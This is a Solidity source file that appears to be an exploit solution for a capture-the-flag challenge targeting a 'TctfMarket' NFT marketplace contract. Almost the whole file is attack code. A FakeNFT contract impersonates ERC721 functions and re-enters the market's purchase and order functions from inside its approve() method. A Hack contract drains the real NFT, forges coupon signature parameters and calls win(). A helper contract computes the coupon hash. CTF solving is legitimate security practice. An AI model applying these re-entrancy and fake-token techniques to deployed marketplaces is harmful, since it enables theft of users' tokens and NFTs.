// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "./task.sol";

contract FakeNFT {
    address private DEPLOYER;
    TctfMarket private immutable MARKET;

    constructor(TctfMarket market) {
        DEPLOYER = msg.sender;
        MARKET = market;
    }

    function safeTransferFrom(address, address, uint) external pure returns (bool) {
        return true;
    }

    function getNft(address nft, address to, uint tokenId) external {
        IERC721(nft).transferFrom(address(this), to, tokenId);
    }

    function getCoin(address to, uint amt) external {
        MARKET.tctfToken().transfer(to, amt);
    }

    function approve(address, uint) external returns (bool) {
        MARKET.tctfToken().airdrop();
        MARKET.tctfToken().approve(address(MARKET), type(uint).max);
        MARKET.purchaseOrder(0);
        MARKET.createOrder(address(this), 1, 1337);
        return true;
    }

    function changeOwner(address new_owner) public {
        DEPLOYER = new_owner;
    }

    function ownerOf(uint) external view returns (address) {
        return DEPLOYER;
    }

    function isApprovedForAll(address, address) external pure returns (bool) {
        return true;
    }

    function getApproved(uint) external view returns (address) {
        return DEPLOYER;
    }

    function onERC721Received(address, address, uint, bytes calldata) external pure returns (bytes4) {
        return FakeNFT.onERC721Received.selector;
    }
}

contract Hack {
    FakeNFT public fakenft;
    TctfMarket market;

    constructor(TctfMarket _market) {
        market = _market;
        fakenft = new FakeNFT(market);
    }

    function solve(uint256 r, uint256 s, uint8 v) external {
        IERC20 tctfToken = market.tctfToken();
        tctfToken.approve(address(market), type(uint).max);

        address tctfNFT = address(market.tctfNFT());

        market.purchaseTest(address(fakenft), 0, 1);
        market.purchaseOrder(1);

        fakenft.getNft(tctfNFT, address(this), 1);

        fakenft.changeOwner(msg.sender);
        fakenft.getCoin(address(this), 1);
        market.purchaseWithCoupon(SignedCoupon({
            coupon: Coupon({
                orderId: 1,
                newprice: 1,
                issuer: tx.origin,
                user: address(this),
                reason: "AA"
            }),
            signature: Signature({
                v: 27+v,
                rs: [bytes32(r), bytes32(s)]
            })
        }));

        market.win();
    }

    function onERC721Received(address, address, uint, bytes calldata) external pure returns (bytes4) {
        return FakeNFT.onERC721Received.selector;
    }
}

contract SignatureHelper {
    constructor() {
    }

    function serialize(address issuer, address user, address order_nft, uint256 order_token, uint256 order_price, uint256 newprice, bytes calldata reason) public pure returns (bytes32) {
        Order memory order = Order({nftAddress: order_nft, tokenId: order_token, price: order_price});
        bytes memory serialized = abi.encode(
            "I, the issuer", issuer,
            "offer a special discount for", user,
            "to buy", order, "at", newprice,
            "because", reason
        );
        return keccak256(serialized);
    }
}
